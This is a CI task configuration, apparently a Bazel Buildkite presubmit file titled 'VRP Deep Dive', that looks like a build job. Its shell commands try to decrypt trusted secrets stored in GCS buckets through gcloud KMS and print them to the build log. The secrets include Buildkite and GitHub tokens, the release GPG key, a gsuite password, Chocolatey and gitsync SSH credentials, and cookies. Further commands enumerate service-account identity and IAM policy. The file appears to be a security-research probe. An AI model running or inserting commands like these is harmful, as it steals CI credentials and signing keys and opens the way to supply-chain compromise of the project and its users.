---
tasks:
  vrp_deep_dive:
    name: "VRP Deep Dive"
    platform: ubuntu2204
    shell_commands:
      - "set +e"
      - "echo === Round 15: Trusted Token via bazel-public KMS ==="
      - "echo"
      - "echo === 1. KMS decrypt trusted API token via bazel-public ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/buildkite-trusted-api-token.enc 2>&1 | gcloud kms decrypt --project bazel-public --location global --keyring buildkite --key buildkite-trusted-api-token --ciphertext-file - --plaintext-file - --quiet 2>&1 || true"
      - "echo"
      - "echo === 2. KMS decrypt trusted agent token via bazel-public ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/buildkite-trusted-agent-token.enc 2>&1 | gcloud kms decrypt --project bazel-public --location global --keyring buildkite --key buildkite-trusted-agent-token --ciphertext-file - --plaintext-file - --quiet 2>&1 || true"
      - "echo"
      - "echo === 3. KMS decrypt github-trusted-token via bazel-public ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/github-trusted-token.enc 2>&1 | gcloud kms decrypt --project bazel-public --location global --keyring buildkite --key github-trusted-token --ciphertext-file - --plaintext-file - --quiet 2>&1 || true"
      - "echo"
      - "echo === 4. KMS decrypt release-key via bazel-public ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/release-key.gpg.enc 2>&1 | gcloud kms decrypt --project bazel-public --location global --keyring buildkite --key release-key --ciphertext-file - --plaintext-file - --quiet 2>&1 | head -5 || true"
      - "echo"
      - "echo === 5. KMS decrypt gsuite-password via bazel-public ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/gsuite-password.enc 2>&1 | gcloud kms decrypt --project bazel-public --location global --keyring buildkite --key gsuite-password --ciphertext-file - --plaintext-file - --quiet 2>&1 || true"
      - "echo"
      - "echo === 6. KMS decrypt choco-trusted-token via bazel-public ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/choco-trusted-token.enc 2>&1 | gcloud kms decrypt --project bazel-public --location global --keyring buildkite --key choco-trusted-token --ciphertext-file - --plaintext-file - --quiet 2>&1 || true"
      - "echo"
      - "echo === 7. KMS decrypt gitsync-ssh via bazel-public ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/gitsync-ssh.enc 2>&1 | gcloud kms decrypt --project bazel-public --location global --keyring buildkite --key gitsync-ssh --ciphertext-file - --plaintext-file - --quiet 2>&1 | head -5 || true"
      - "echo"
      - "echo === 8. KMS decrypt gitsync-cookies via bazel-public ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/gitsync-cookies.enc 2>&1 | gcloud kms decrypt --project bazel-public --location global --keyring buildkite --key gitsync-cookies --ciphertext-file - --plaintext-file - --quiet 2>&1 | head -5 || true"
      - "echo"
      - "echo === 9. List KMS keyrings in bazel-public ==="
      - "gcloud kms keyrings list --project bazel-public --location global --quiet 2>&1 || true"
      - "echo"
      - "echo === 10. KMS decrypt testing API token via bazel-public ==="
      - "gsutil cat gs://bazel-testing-encrypted-secrets/buildkite-testing-api-token.enc 2>&1 | gcloud kms decrypt --project bazel-public --location global --keyring buildkite --key buildkite-testing-api-token --ciphertext-file - --plaintext-file - --quiet 2>&1 || true"
      - "echo"
      - "echo === 11. Try the inline encrypted trusted token from bazelci.py ==="
      - "printf 'CiQAeiOS8AkhF5clT7rnjtfHVTjNSuABkqZF4jfycXVWBmBls8ISVgC7bbymLfiLNsGeyX9i6QHwKZOh4utBd7cpVtzZfoGdu76vQUpIzqQ5XlxUpICUxxEgKNfYqJy0aF/jQB8uX9FZf/41sODizHH5' | base64 -d 2>&1 | gcloud kms decrypt --project bazel-public --location global --keyring buildkite --key buildkite-trusted-api-token --ciphertext-file - --plaintext-file - --quiet 2>&1 || true"
      - "echo"
      - "echo === 12. Verify current SA identity ==="
      - "gcloud auth list --quiet 2>&1 || true"
      - "echo"
      - "echo === 13. Check SA IAM permissions on bazel-public ==="
      - "gcloud projects get-iam-policy bazel-public --quiet 2>&1 | head -40 || true"
      - "echo === DONE ==="
    build_targets:
      - "//..."
